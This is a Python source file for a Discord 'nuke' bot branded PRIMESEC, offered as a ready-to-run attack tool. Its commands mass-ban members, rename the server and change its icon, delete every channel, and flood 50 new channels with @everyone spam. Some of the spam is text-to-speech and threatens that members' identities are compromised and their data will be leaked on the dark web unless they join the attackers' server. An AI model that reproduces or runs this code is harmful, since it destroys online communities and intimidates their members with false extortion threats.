# Copyright (c) Primesec ops - Advanced Nuke Tool
import discord
from discord.ext import commands
import aiohttp
import asyncio
import random
import sys

TOKEN = input("Bot Token -> ")

print("\nPresence mode (online / dnd / idle / invisible) [default: dnd]:")
mode_input = input("> ").strip().lower()
status_map = {
    "online": discord.Status.online,
    "dnd": discord.Status.dnd,
    "idle": discord.Status.idle,
    "invisible": discord.Status.invisible
}
status = status_map.get(mode_input, discord.Status.dnd)

custom_status = input("Custom status text (leave empty for none): ").strip()
if not custom_status:
    custom_status = None

intents = discord.Intents.default()
intents.members = True
intents.guilds = True
intents.messages = True
intents.message_content = True
intents.bans = True

bot = commands.Bot(command_prefix="?", intents=intents, help_command=None)

CHANNELS_TO_CREATE = 50
CHANNEL_NAME = "ø₩₦ɇđ-฿ɏ-₱ɽł₥ɇ₴ɇ₵"
SERVER_NAME = "ø₩₦ɇđ-฿ɏ-₱ɽł₥ɇ₴ɇ₵"
SERVER_ICON_URL = "https://i.ibb.co/dsyMTpzm/1774519558365-image.png"

SPAM_MSG_DEFAULT = ("# ɎØɄ ₳ⱤɆ ₳ⱠⱤɆ₳ĐɎ ɆӾ₱Ø₴ɆĐ.\n\n"
                    "# ₮Ⱨł₴ ₴ɆⱤVɆⱤ ₲Ɇ₮₮ł₦₲ ₣Ʉ₵₭ɆĐ ฿Ɏ [// PRIMESEC //]\n"
                    "# ɎØɄⱤ łĐɆ₦₮ł₮Ɏ Ⱨ₳₴ ฿ɆɆ₦ ₵Ø₥₱ⱤØ₥ł₴ɆĐ. ł₣ ɎØɄ ĐØ ₦Ø₮ ₩ł₴Ⱨ ɎØɄⱤ ₱ɆⱤ₴Ø₦₳Ⱡ ł₦₣ØⱤ₥₳₮łØ₦ ₮Ø ฿Ɇ ⱠɆ₳₭ɆĐ Ø₦ ₮ⱧɆ Đ₳Ɽ₭ ₩Ɇ฿, ⱠɆ₳VɆ ₮Ⱨł₴ ₴ɆⱤVɆⱤ ł₥₥ɆĐł₳₮ɆⱠɎ ₳₦Đ JØł₦ ØɄⱤ ₴ɆⱤVɆⱤ. / [// PRIMESEC //] discord.gg/primesec-1414146515139559495 @everyone @here ,[// PRIMESEC //] - discord.gg/primesec-1414146515139559495")

SPAM_MSG_TTS = ("# You are already exposed.\n\n"
                "# This server is being attacked by PRIMESEC.\n\n"
                "# Your identity has been compromised. If you do not wish your personal information to be leaked on the dark web, leave this server immediately and join our server.\n\n"
                "# PRIMESEC — discord.gg/primesec-1414146515139559495\n\n@everyone @here")

SPAMMING = False
SPAM_TASKS = []

async def fetch_image(url):
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(url, timeout=10) as resp:
                if resp.status == 200:
                    return await resp.read()
        except Exception:
            pass
    return None

async def change_server(guild):
    try:
        await guild.edit(name=SERVER_NAME)
        print("✓ Server name changed")
    except Exception as e:
        print(f"✗ Rename failed: {e}")
    icon = await fetch_image(SERVER_ICON_URL)
    if icon:
        try:
            await guild.edit(icon=icon)
            print("✓ Server icon changed")
        except Exception as e:
            print(f"✗ Icon failed: {e}")

async def delete_all_channels(guild):
    for channel in guild.channels:
        try:
            await channel.delete()
            print(f"✓ Deleted: {channel.name}")
        except Exception:
            pass
        await asyncio.sleep(0.15)

async def spam_loop(channel, msg, tts):
    global SPAMMING
    while SPAMMING:
        try:
            await channel.send(msg, tts=tts)
        except Exception:
            pass
        await asyncio.sleep(0.65)  

async def create_and_spam(guild, spam_msg, tts=False):
    global SPAMMING, SPAM_TASKS
    SPAMMING = True
    for i in range(CHANNELS_TO_CREATE):
        try:
            new_channel = await guild.create_text_channel(CHANNEL_NAME)
            print(f"✓ Created {CHANNEL_NAME} ({i+1}/{CHANNELS_TO_CREATE})")
            task = bot.loop.create_task(spam_loop(new_channel, spam_msg, tts))
            SPAM_TASKS.append(task)
        except Exception as e:
            print(f"✗ Channel creation error: {e}")
        await asyncio.sleep(0.3)

async def ban_all_bannable(guild, me, ctx_author):
    members = [m for m in guild.members 
               if m != me and m != ctx_author and not m.bot 
               and m.top_role < me.top_role]
    count = 0
    for member in members:
        try:
            await guild.ban(member, reason="PRIMESEC purge")
            print(f"✓ Banned: {member}")
            count += 1
        except Exception:
            pass
        await asyncio.sleep(0.5)
    print(f"✓ Banned {count} members")
    return count

async def ban_random(guild, me, ctx_author, percentage=0.3):
    members = [m for m in guild.members 
               if m != me and m != ctx_author and not m.bot 
               and m.top_role < me.top_role]
    if not members:
        return 0
    ban_count = max(1, int(len(members) * percentage))
    to_ban = random.sample(members, min(ban_count, len(members)))
    count = 0
    for member in to_ban:
        try:
            await guild.ban(member, reason="PRIMESEC random nuke")
            print(f"✓ Banned: {member}")
            count += 1
        except Exception:
            pass
        await asyncio.sleep(0.5)
    print(f"✓ Banned {count} random members")
    return count

@bot.event
async def on_ready():
    await bot.change_presence(status=status, 
                              activity=discord.Game(name=custom_status) if custom_status else None)
    invite_link = f"https://discord.com/oauth2/authorize?client_id={bot.user.id}&scope=bot&permissions=8"
    print(f"\n✅ Ready: {bot.user}\n🔗 Invite: {invite_link}\n")

@bot.command()
async def prime(ctx):
    await ctx.send("```?prime1 - Ban all → rename → nuke (50ch, default spam)\n?prime2 - Rename → nuke → random ban (30%)\n?prime3 - Rename → nuke → random ban + TTS + new spam\n?prime4 - Ban all → rename → nuke + TTS + new spam```")

@bot.command()
async def prime1(ctx):
    global SPAMMING, SPAM_TASKS
    SPAMMING = False
    for t in SPAM_TASKS:
        t.cancel()
    SPAM_TASKS.clear()
    guild = ctx.guild
    me = guild.me
    await ban_all_bannable(guild, me, ctx.author)
    await change_server(guild)
    await delete_all_channels(guild)
    await create_and_spam(guild, SPAM_MSG_DEFAULT, tts=False)
    print("✅ prime1 executed")

@bot.command()
async def prime2(ctx):
    global SPAMMING, SPAM_TASKS
    SPAMMING = False
    for t in SPAM_TASKS:
        t.cancel()
    SPAM_TASKS.clear()
    guild = ctx.guild
    me = guild.me
    await change_server(guild)
    await delete_all_channels(guild)
    await create_and_spam(guild, SPAM_MSG_DEFAULT, tts=False)
    await ban_random(guild, me, ctx.author, 0.3)
    print("✅ prime2 executed")

@bot.command()
async def prime3(ctx):
    global SPAMMING, SPAM_TASKS
    SPAMMING = False
    for t in SPAM_TASKS:
        t.cancel()
    SPAM_TASKS.clear()
    guild = ctx.guild
    me = guild.me
    await change_server(guild)
    await delete_all_channels(guild)
    await create_and_spam(guild, SPAM_MSG_TTS, tts=True)
    await ban_random(guild, me, ctx.author, 0.3)
    print("✅ prime3 executed")

@bot.command()
async def prime4(ctx):
    global SPAMMING, SPAM_TASKS
    SPAMMING = False
    for t in SPAM_TASKS:
        t.cancel()
    SPAM_TASKS.clear()
    guild = ctx.guild
    me = guild.me
    await ban_all_bannable(guild, me, ctx.author)
    await change_server(guild)
    await delete_all_channels(guild)
    await create_and_spam(guild, SPAM_MSG_TTS, tts=True)
    print("✅ prime4 executed")

if __name__ == "__main__":
    try:
        bot.run(TOKEN)
    except Exception as e:
        print(f"💀 Fatal error: {e}")
        sys.exit(1)